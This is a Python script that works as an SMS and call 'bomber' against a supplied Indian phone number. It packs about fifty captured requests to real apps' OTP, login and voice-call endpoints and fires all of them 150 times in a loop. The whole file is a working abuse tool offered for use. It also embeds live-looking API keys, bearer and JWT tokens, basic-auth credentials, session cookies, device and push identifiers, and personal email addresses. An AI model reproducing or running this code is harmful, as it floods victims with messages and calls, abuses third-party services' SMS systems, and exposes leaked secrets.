import requests
import json
import time

def smsg(number):
    number = str(number)
    
    # List of APIs with their corresponding URLs, headers, and payloads
    apis = [
        {
            "method": "POST",
            "url": "https://learn.seekog.com/webservice/rest/server.php?moodlewsrestformat=json&wsfunction=auth_otp_request_otp",
            "headers": {
                "Host": "learn.seekog.com",
                "content-length": "97",
                "sec-ch-ua": '"Chromium";v="124", "Android WebView";v="124", "Not-A.Brand";v="99"',
                "accept": "application/json, text/plain, */*",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36 MoodleMobile 4.1.1 (41100)",
                "sec-ch-ua-platform": '"Android"',
                "origin": "http://localhost",
                "x-requested-with": "com.moodle.seekog",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "http://localhost/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "priority": "u=1, i"
            },
            "data": {
                "username": "+91"+number,
                "wsfunction": "auth_otp_request_otp",
                "wstoken": "b9749ed9fefb5ec57dad6c05d93ab6da"
            }
        },
        {
            "method": "GET",
            "url": "https://amaron.mloyalretail.com/m/forgot_pswd.asp",
            "headers": {
                "Host": "amaron.mloyalretail.com",
                "sec-ch-ua": '"Chromium";v="124", "Android WebView";v="124", "Not-A.Brand";v="99"',
                "accept": "*/*",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "x-requested-with": "com.mobiquest.amaron",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "priority": "u=1, i"
            },
            "params": {
                "mobileno": number
            }
        },
        {
            "method": "POST",
            "url": "https://api.madrasmandi.in/api/v1/auth/otp",
            "headers": {
                "Host": "api.madrasmandi.in",
                "mm-build-version": "2.5.4",
                "mm-version-code": "2005004",
                "mm-device-type": "android",
                "delivery-type": "app",
                "x-requested-with": "XMLHttpRequest",
                "authorization": "Bearer",
                "content-type": "application/x-www-form-urlencoded",
                "content-length": "101",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            },
            "data": {
                "phone": "+91"+number,
                "scope": "client",
                "client_secret": "lkvAyfrqjA7Z18bjSxayYbvdD7ALJO9QYHYgPATw",
                "client_id": "2"
            }
        },
        {
            "method": "POST",
            "url": "https://api.bharatloanfintech.com/saveCustomerProfileAAPPS",
            "headers": {
                "Accept": "application/json",
                "Authtoken": "",
                "Auth": "ZGRmMzg0ZDlhNjQyZGE4MzI0YTdmNDNkODcyZDA3MzU=",
                "Content-Type": "application/json; charset=UTF-8",
                "Content-Length": "389",
                "Host": "api.bharatloanfintech.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/5.0.0-alpha.2"
            },
            "data": {
                "adjust_adid": 1,
                "adjust_gps_id": 1,
                "adjust_idfa": 1,
                "current_page": "login",
                "fcm_token": "ei4BdR0tRh6csHkndeAaPh:APA91bGBhUyP_tKrbUuvOQ4MhD7_c-zUFZnONSfv2EZzfO5Xp_tpw5U1Ryx3aX6REV52ANJY6m2RcIFcxWQjDfwKlXBsBLUHbHTZzpdy-fjmup9Xilo1jPAKHgswVV0xqXSPZZfU1Zef",
                "geo_lat": "",
                "geo_long": "",
                "is_existing_customer": 0,
                "mobile": number,
                "pancard": "",
                "utm_campaign": "",
                "utm_medium": "",
                "utm_source": ""
            }
        },
        {
            "method": "POST",
            "url": "https://sales.shreejamilk.com/admin/shreeja_api/step1",
            "headers": {
                "Authorization": "Basic YWRtaW46MTIzNDU2",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "17",
                "Host": "sales.shreejamilk.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.2.2"
            },
            "data": {
                "mobile": number
            }
        },
        {
            "method": "POST",
            "url": "https://store.caryanams.com/api/App/send_otp",
            "headers": {
                "Host": "store.caryanams.com",
                "content-type": "application/x-www-form-urlencoded",
                "content-length": "50",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.12.0"
            },
            "data": {
                "contact": "+91"+number,
                "device_id": "c7abc1fd7459e84c"
            }
        },
        {
            "method": "POST",
            "url": "https://db.ezobooks.in/kappa/api/login/sendOtp",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "16",
                "Host": "db.ezobooks.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.10.0"
            },
            "data": {
                "phone": number
            }
        },
        {
            "method": "POST",
            "url": "https://merucabapp.com/api/otp/generate",
            "headers": {
                "Mobilenumber": number,
                "Mid": "22c1197675ae55ad475cecc77df0db8792c8b370795ffed606b83e2549dadf12",
                "Oauthtoken": "",
                "AppVersion": "233",
                "ApiVersion": "6.2.42",
                "DeviceType": "Android",
                "DeviceId": "c7abc1fd7459e84c",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "24",
                "Host": "merucabapp.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.0"
            },
            "data": f"mobile_number={number}"
        },
        {
            "method": "POST",
            "url": "https://asphalt.turnip.gg/api/v1/otp/request-otp",
            "headers": {
                "Host": "asphalt.turnip.gg",
                "content-type": "application/json; charset=UTF-8",
                "content-length": "42",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.14.9",
                "os": "14",
                "app-version": "5.8.3",
                "platform": "Android",
                "build-number": "5083100",
                "unique-device-id": "c7abc1fd7459e84c",
                "accept-language": "en-US",
                "x-api-key": "821eb3bd-4086-4a4d-b793-f8add4345787"
            },
            "data": json.dumps({"countryCode": "91", "number": number})
        },
        {
            "method": "POST",
            "url": "https://rideally.com/services/auth/getotp",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "rideally.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Length": "39"
            },
            "data": f"device_type=1&mobile_number={number}&"
        },
        {
            "method": "POST",
            "url": "https://app.chaayos.com/app-crm/v2/crm/v/r2-ivr/1000",
            "headers": {
                "Host": "app.chaayos.com",
                "accept": "application/json",
                "devicekey": "033aJUvGhyAVBtPM4BdE0N7SvhJ6YhaoXloyYXu7C6uhCa0e0+6qWLNlHSzGuVHa",
                "content-type": "application/json",
                "content-length": "10",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": number
        },
        {
            "method": "POST",
            "url": "https://api.fountain.cool/online-ag/api/login/otp/generate",
            "headers": {
                "user-agent": "Dart/2.19 (dart:io)",
                "service.auth.key": "9129998921",
                "accept-encoding": "gzip",
                "content-length": "49",
                "organizationid": "1",
                "host": "api.fountain.cool",
                "content-type": "application/json",
                "applicationid": "31"
            },
            "data": json.dumps({"applicationId": 31, "phoneNumber": "91" + number})
        },
        {
            "method": "POST",
            "url": "http://ieniapi.eniclub.in/api/users/login",
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Content-Length": "119",
                "Host": "ieniapi.eniclub.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.12.1"
            },
            "data": json.dumps({"device_id": "c7abc1fd7459e84c", "language_id": 1, "mobile": number, "role": 1, "sms_type": "RESEND_SMS", "source": "USER"})
        },
        {
            "method": "POST",
            "url": "http://ieniapi.eniclub.in/api/users/login",
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Content-Length": "125",
                "Host": "ieniapi.eniclub.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.12.1"
            },
            "data": json.dumps({"device_id": "c7abc1fd7459e84c", "language_id": 1, "mobile": number, "role": 1, "sms_type": "RESEND_VOICECALL", "source": "USER"})
        },
        {
            "method": "POST",
            "url": "https://www.shyaway.com/graphql",
            "headers": {
                "Host": "www.shyaway.com",
                "accept": "application/json",
                "x-apollo-operation-id": "bef185d336773152ee1e8e072904fd82d5bd3f6c89fcb610b5fd77a526f85a74",
                "x-apollo-operation-name": "GenerateLoginOTP",
                "content-type": "application/json; charset=utf-8",
                "content-length": "355",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            },
            "data": json.dumps({"operationName": "GenerateLoginOTP", "variables": {"username": number, "type": "login"}, "query": "mutation GenerateLoginOTP($username :String!, $type : String!) { generateOTP(type: $type, username: $username) { __typename status message data { __typename id statusCode customerEmail { __typename key value } customerMobile { __typename key value } } } }"})
        },
        {
            "method": "POST",
            "url": "https://drizzles.spectroapp.com/api/m/customer/auth/send/otp",
            "headers": {
                "Host": "drizzles.spectroapp.com",
                "accept": "application/json",
                "authorization": "Bearer null",
                "restaurant": "9",
                "content-type": "application/json",
                "content-length": "53",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": json.dumps({"phone": number, "device_id": "c7abc1fd7459e84c"})
        },
        {
            "method": "POST",
            "url": "https://www.klikk.co.in/api/?r=User%2FLoginWithOTP",
            "headers": {
                "Host": "www.klikk.co.in",
                "api-key": "f4f068e71e0d87bf0ad51e6214ab84e9",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.0"
            },
            "data": {
                "appVersion": "67",
                "contactNumber": f"+91-{number}",
                "deviceId": "c7abc1fd7459e84c",
                "deviceName": "samsung SM-F7110",
                "deviceToken": "ccLYOFb0ToSRojHA80gt08:APA91bHbZ1OB7YVwMA3ucZebydnY5O4gzHEPV9XnK13KLYyVEb9rmxZfBA8Xxntiue0Yeyu89hfo2xYw_N-gsBAEKP9hSLjNsKhVQLw2Y2QxlCETbCWPT1NKyTTvrkvHt3UI6R1MXrzO",
                "deviceType": "android",
                "socialType": "0"
            }
        },
        {
            "method": "POST",
            "url": "https://api.jobhai.com/auth/recruiter/v2/send_otp",
            "headers": {
                "Host": "api.jobhai.com",
                "x-transaction-id": "RecApp-a231f1dc-bcfe-43c5-8308-c82a82f137aa",
                "device-id": "1fb0feaf-bfa2-4a78-a198-dc6020aeec85",
                "versioncode": "230010809",
                "user-agent": "RecApp/230010809",
                "source": "APP",
                "session-id": "15d38691-b7a7-47cf-afb1-f787eedc4a43",
                "referer": "https://www.jobhai.com/hire",
                "cookie": "source=RecApp/230010809",
                "accept": "*/*",
                "accept-language": "*",
                "accept-encoding": "*",
                "content-type": "application/json; charset=utf-8"
            },
            "data": {
                "phone": number
            }
        },
        {
            "method": "POST",
            "url": "https://ai.gigin.ai/live_app_api/index.php/api_controller/register",
            "headers": {
                "Host": "ai.gigin.ai",
                "Connection": "keep-alive",
                "Content-Length": "158",
                "sec-ch-ua": '"Chromium";v="124", "Android WebView";v="124", "Not-A.Brand";v="99"',
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "Origin": "https://localhost",
                "X-Requested-With": "com.giginap.jobs",
                "Sec-Fetch-Site": "cross-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://localhost/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9"
            },
            "data": {
                "Mobile": number,
                "type": "Android",
                "SID": None,
                "rel_id": None,
                "version": "4.6.0",
                "deviceModel": "SM-F7110",
                "deviceVersion": "14",
                "deviceManufactur": "samsung"
            }
        },
        {
            "method": "GET",
            "url": "https://api.pocketnovel.com/v2/user_api/user.send_otp",
            "headers": {
                "Host": "api.pocketnovel.com",
                "ad-id": "d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785",
                "version-name": "1.7.6",
                "region-code": "UP",
                "client-ts": "1714841716413",
                "which-app": "com.pocketfm.novel",
                "is-headset": "false",
                "device-create-time": "1714841706",
                "locale": "IN",
                "device-id": "c7abc1fd7459e84c",
                "platform": "android",
                "user-tg": "google-play",
                "content-ln": "hi",
                "app-name": "pocket_novel",
                "auth-token": "03971f2055de19233bcb54434a22d21fadaeb6bb",
                "content-type": "application/json;charset=utf-8",
                "screen-density": "1080px",
                "app-client": "consumer-android",
                "accept": "application/json",
                "app-version": "647",
                "ip-address": "192.0.0.8",
                "is-fg": "true",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            },
            "params": {
                "phone_number": f"+91{number}",
                "country_code": "+91",
                "channel": ""
            }
        },
        {
            "method": "POST",
            "url": "https://api.doubtnut.com/v4/student/login",
            "headers": {
                "Host": "api.doubtnut.com",
                "version_code": "1158",
                "has_upi": "true",
                "device_model": "SM-F7110",
                "android_sdk_version": "34",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            },
            "data": {
                "app_version": "7.10.49",
                "aaid": "d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785",
                "course": "",
                "phone_number": number,
                "language": "en",
                "udid": "c7abc1fd7459e84c",
                "class": "",
                "gcm_reg_id": "e22lGNSVQrOSgtZCRHZqo3:APA91bHgPX8e1u6pHq09qQQ-LEaf6m3o0vMPLftv-GQjbM29MJ8m3-EhyyoWPwPsy2RMGYxVq28r6J0UC-UslEBJ4r03v4ClPqJiKoskoHKwFAlNq6ULcL1THrlhQeUeOSgTPcpLOEj1"
            }
        },
        {
            "method": "PUT",
            "url": "https://micro.doubtnut.com/otp/send-call",
            "headers": {
                "Host": "micro.doubtnut.com",
                "version_code": "1158",
                "has_upi": "true",
                "device_model": "SM-F7110",
                "android_sdk_version": "34",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            },
            "data": {
                "phone": number,
                "locale": "en"
            }
        },
        
        {
            "method": "POST",
            "url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
            "headers": {
                "Host": "prod-auth-api.upgrad.com",
                "requestid": "5bf2ce83-8a3a-4181-af6e-4a99acae123a",
                "distinctid": "c7abc1fd7459e84c",
                "operatingsystem": "Android 14",
                "browserinfo": "App 356",
                "devicetype": "samsung SM-F7110",
                "courseid": "0",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.0"
            },
            "data": {
                "phoneNumber": f"+91{number}"
            }
        },
        {
      "url": "https://py.api.localwell.in/authenticate/send_login_otp",
      "method": "POST",
      "data": {
        "app_version_code": 80,
        "mobile_number": number,
        "is_whatsapp_opted": "true",
        "device_type": "mobile"
      }
    },
    {
      "url": "https://docon.co.in/api/v1/user/online-login",
      "method": "POST",
      "data": {
        "mobileNumber": number
      }
    },
    {
      "url": "https://user-api.redtaxi.co.in/v2/login",
      "method": "POST",
      "data": {
        "phone": number
      }
    },
    {
      "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
      "method": "POST",
      "data": {
        "language": 1,
        "phone": number
      }
    },
    {
      "url": "https://app.getswipe.in/api/user/mobile_login",
      "method": "POST",
      "data": {
        "mobile": number,
        "resend": 0
      }
    },
    {
      "url": "https://v1.pro.rechargecube.in/auth/login/otp",
      "method": "POST",
      "data": {
        "mobile": number
      }
    },
    {
      "url": "https://nfapi.naturefit.in/api/auth/localsignup",
      "method": "POST",
      "data": {
        "mobile": number,
        "email": "null",
        "otp": "null",
        "doctor_reference_code": "null"
      }
    },
    {
      "url": "https://api.koloapp.in/konnect/v1/users/otp",
      "method": "POST",
      "data": {
        "countryCode": "+91",
        "mobile": "+91"+number
      }
    },
    {
      "url": "https://www.apnidukandari.com/api/register",
      "method": "POST",
      "data": {
        "first_name": "YTRAVAN",
        "email": "shivamrajput6006@gmail.com",
        "uuid": "100391226984769639023",
        "avatar": "null",
        "phone_number": number,
        "privacy": "true",
        "token": "06162cc11cd8cf0958ebbc62fadc4a48"
      }
    },
    {
      "url": "https://user.vedantu.com/user/preLoginVerification",
      "method": "POST",
      "data": {
        "phoneCode": "+91",
        "phoneNumber": number,
        "requestSource": "ANDROID",
        "appVersionCode": "2.4.0"
      }
    },
    {
      "url": "https://mudrex.com/api/auth-services/v1/accounts/phone/otp",
      "method": "POST",
      "data": {
        "category": "user",
        "organization": {
          "domain": "mudrex.com"
        },
        "config": {
          "phone": "+91"+number
        }
      }
    },
    {
      "url": "https://www.nykaafashion.com/webscripts/api/otp/generate",
      "method": "POST",
      "data": {
        "customer_mobile": number
      }
    },
    {
      "url": "https://asia-south1-op-d2r.cloudfunctions.net/sendOtp",
      "method": "POST",
      "data": {
        "data": {
          "uid": "",
          "selfUserId": "",
          "env": "prod",
          "appVersion": "5.9.0",
          "phoneNumber": "+91"+number,
          "isResend": "false"
        }
      }
    },
    {
      "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
      "method": "POST",
      "data": {
        "screen": "1260 X 2624",
        "emailID": "shivamyou66200@gmail.com",
        "gps": "true",
        "imsi": "",
        "mobileNo": number,
        "firstName": "Shiva Riy",
        "osVersion": "14",
        "build": "android-phone",
        "countryCode": "91",
        "vendor": "samsung",
        "imei": "181105746837606",
        "model": "SM-F7110",
        "req": "generate"
      }
    },
    {
            "method": "POST",
            "url": "https://oneiric11.com/user/auth/login",
            "headers": {
                "Host": "oneiric11.com",
                "content-length": "255",
                "sec-ch-ua": '"Chromium";v="124", "Android WebView";v="124", "Not-A.Brand";v="99"',
                "_ga_token": "undefined",
                "accept-language": "en",
                "x-refid": "undefined",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "android-app Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "requesttime": "undefined",
                "content-type": "application/json;charset=UTF-8",
                "accept": "application/json, text/plain, */*",
                "ult": "",
                "sessionkey": "",
                "device": "android",
                "user-token": "undefined",
                "sec-ch-ua-platform": '"Android"',
                "origin": "https://oneiric11.com",
                "x-requested-with": "com.oneiric.game",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://oneiric11.com/signup",
                "accept-encoding": "gzip, deflate, br, zstd",
                "priority": "u=1, i"
            },
            "data": {
                "phone_no": number,
                "phone_code": "91",
                "device_type": "1",
                "device_id": "dtDGTWDIRX6_xgLpACMXWo:APA91bF90NYroQ1-58N0__T85LvUt2VI0ogHYWtfQFRBR-AXXos78gDJzUe9I8FaxXcGUFTNeEmCR8YGIcUSjwMBFXBn0XQpBKa_AHFG2JypSUNS-QIlUtsWna02vs0DHZnwTabqKYjY",
                "otp_hash": None
            }
        },
        {
            "method": "POST",
            "url": "https://cityfurnish.com/v1/user/sendotp_new",
            "headers": {
                "Host": "cityfurnish.com",
                "content-type": "multipart/form-data; boundary=a4ea9dcc-f610-4b15-ab52-0ecdd4168863",
                "content-length": "170",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.12.1"
            },
            "data": {
                "mobile_number": number
            }
        },
        {
            "method": "POST",
            "url": "https://mytvsapp-connect.tvs.in/api/v1/authenticate/sms/sendotp",
            "headers": {
                "Host": "mytvsapp-connect.tvs.in",
                "accept": "application/json, text/plain, */*",
                "client_code": "MvxW3k482v2o",
                "rememberme": "true",
                "countryname": "All",
                "timezone": "Asia/Calcutta",
                "token": "f7sgevhvT_moWhtaaygdtw:APA91bG3Ni804JJU1GDhQNGwj_mRcm6VWgsC05ss-kTWgp5J05itoeSXxTjDqAqk3DXe8Oh9nUxqjNVtvDka6eq912dLb3CKSiyDiy6orK3k5lPc5vswqbGixfdSCxWXsbkkmwLz3rRX",
                "content-type": "application/json",
                "content-length": "42",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {
                "mobile": "91" + number,
                "is_login": False
            }
        },
        {
            "method": "POST",
            "url": "https://www.apnidukandari.com/api/register",
            "headers": {
                "User-Agent": "okhttp/3.12.1",
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json"
            },
            "data": {
                "first_name": "YTRAVAN",
                "email": "shivamrajput662006@gmail.com",
                "uuid": "100391226984769639023",
                "avatar": None,
                "phone_number": number,
                "privacy": True,
                "token": "06162cc11cd8cf0958ebbc62fadc4a48"
            }
        },
        {
            "method": "POST",
            "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
            "headers": {
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json",
                "lang": "ENG",
                "AppIdKey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHAiOjAsImZmIjoiTSIsImJkIjoiYW5kcm9pZC1waG9uZSIsIm5iZiI6MTcxNTUzNzk4MCwic3JjIjoiZW10bXciLCJhdiI6IjQuNS4xNC4yIiwiYXBwaWQiOiI5MGM1ZWI3ZmI1ZThlZmNlMzZjOGNjMDllZWQwNzU4MiIsImlzcyI6ImVtdCIsImV4cCI6MTcxNTUzODYwMCwiaWF0IjoxNzE1NTM4MjgwfQ.wqCB5eHG7QiCr02U4qdD49hNhKVOmYLgQYUJNLe0VC8"
            },
            "data": {
                "screen": "1260 X 2624",
                "emailID": "shivamyou6000@gmail.com",
                "gps": "true",
                "imsi": "",
                "mobileNo": number,
                "firstName": "Shiva Riy",
                "osVersion": "14",
                "build": "android-phone",
                "countryCode": "91",
                "vendor": "samsung",
                "imei": "181105746837606",
                "model": "SM-F7110",
                "req": "generate"
            }
        },
        {
            "method": "POST",
            "url": "https://foodro.in/mobile/api/sent_otp.php",
            "headers": {
                "Host": "foodro.in",
                "Content-Length": "125",
                "sec-ch-ua": '"Chromium";v="124", "Android WebView";v="124", "Not-A.Brand";v="99"',
                "accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "Origin": "https://foodro.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "Referer": "https://foodro.in/mobile/login.php?ref=my_account",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "cookie": "PHPSESSID=8uh6s67trl71jkpehvir2c38k1; city=Kochi; f_id=01a1556c78c561b6d6c63c40bc1678a2597efc950c2271a7014a256312774aa8e192daadaefd63400121d33d94472f992420a02a7c0c6d194550faa8609cedfa; user_s=0; _ga_B51XBWFGP2=GS1.1.1714911245.1.0.1714911245.60.0.942229316; _ga_SF8QHH846L=GS1.1.1714911245.1.0.1714911245.60.0.0; _ga=GA1.2.877931294.1714911245; _gid=GA1.2.1528247045.1714911246; _gat_gtag_UA_121037465_1=1",
                "priority": "u=1, i"
            },
            "data": {
                "number": number,
                "s_id": "5d11352d37c17e5242136069a5661e6aaa58fb23923ef9ced3c6aef6dd70ad66",
                "e_id": "524132b822571e303a6b87da9cd66169"
            }
        },
        
        {
            "method": "POST",
            "url": "https://indpe.co.in/user_apis/api.php",
            "headers": {
                "Content-Length": "95",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "indpe.co.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            },
            "data": {
                "type": "sendOTP",
                "number": number,
                "hash": "296cace78970b1fafafbc596f04b204c",
                "ip": "---",
                "city": "---",
                "region": "---"
            }
        },
        {
            "method": "POST",
            "url": "https://tileswale.com/api/v45/user_otp_send",
            "headers": {
                "Host": "tileswale.com",
                "User-Agent": "android",
                "twappversion": "2.1.3",
                "twapiversion": "v45",
                "twdevicemanufacturer": "samsung",
                "twdeviceosversion": "34",
                "twplatform": "1",
                "twdevicewidth": "1260",
                "twdeviceheight": "2624",
                "twtoken": "",
                "twlanguage": "",
                "twjwttoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqd3RUb2tlbiI6IlRpbGVzIFdhbGUiLCJqd3RTZWNyZXRLZXkiOiJ0d0BkZXZlbG9wZXJzQDkwMzM5MDk5In0.tbgYE2h0ZJ7o9I1bNGtNc1wj28mRxFJmh76u7nIXPf0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "17",
                "Accept-Encoding": "gzip"
            },
            "data": {
                "mobile": number
            }
        },
        {
            "method": "POST",
            "url": "https://anubhutiapis.channel-dss-r1-anubhuti-prod-vpn.ap.e06.c01.johndeerecloud.com/api/registration/resendOTPOnMobile",
            "headers": {
                "Authorization": "Bearer gAAAAABlOOZpZ-GfE6L5AfLC6fmtqNDJXWnyIZR",
                "LanguageCulture": "en-US",
                "Content-Type": "application/json; charset=utf-8",
                "ADRUM_1": "isMobile:true",
                "ADRUM": "isAjax:true",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "anubhutiapis.channel-dss-r1-anubhuti-prod-vpn.ap.e06.c01.johndeerecloud.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Length": "41"
            },
            "data": json.dumps({
                "isExist": False,
                "MobileNo": number
            })
        },
        {
            "method": "POST",
            "url": "https://tileswale.com/api/v45/user_otp_send",
            "headers": {
                "Host": "tileswale.com",
                "User-Agent": "android",
                "twappversion": "2.1.3",
                "twapiversion": "v45",
                "twdevicemanufacturer": "samsung",
                "twdeviceosversion": "34",
                "twplatform": "1",
                "twdevicewidth": "1260",
                "twdeviceheight": "2624",
                "twtoken": "",
                "twlanguage": "",
                "twjwttoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqd3RUb2tlbiI6IlRpbGVzIFdhbGUiLCJqd3RTZWNyZXRLZXkiOiJ0d0BkZXZlbG9wZXJzQDkwMzM5MDk5In0.tbgYE2h0ZJ7o9I1bNGtNc1wj28mRxFJmh76u7nIXPf0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "17",
                "Accept-Encoding": "gzip"
            },
            "data": {
                "mobile": number
            }
        }
        
        
    ]
    
    # Run the requests for 500 times
    for _ in range(150):
        for api in apis:
            if api["method"] == "GET":
                response = requests.get(api["url"], params=api.get("params", {}), headers=api.get("headers", {}))
            elif api["method"] == "POST":
                response = requests.post(api["url"], data=api.get("data", {}), headers=api.get("headers", {}))
            elif api["method"] == "PUT":
                response = requests.put(api["url"], data=api.get("data", {}), headers=api.get("headers", {}))
            print(f"Request to {api['url']} - Status Code: {response.status_code}")
        # Add a delay of 1 second between requests
      #  time.sleep(1)

# Example uage:
#smsg("9442")  # Replace "9442" with the phone number you want to use
